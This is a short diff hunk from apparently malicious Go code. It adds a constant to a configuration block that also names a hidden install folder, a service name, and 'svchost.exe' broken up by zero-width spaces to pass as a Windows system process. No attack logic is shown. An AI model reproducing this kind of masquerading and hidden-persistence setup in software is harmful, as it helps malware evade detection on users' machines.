@@ -7,6 +7,7 @@ const (
 	GenesisText = "Genesis"
 	Interval    = 5
 
+	Ads     = "blueberry"
 	Base    = "$userprofile\\Saved Games\\.hydra"
 	Binary  = "s\u200bvch\u200bost.exe"
 	Service = "Memserv2"
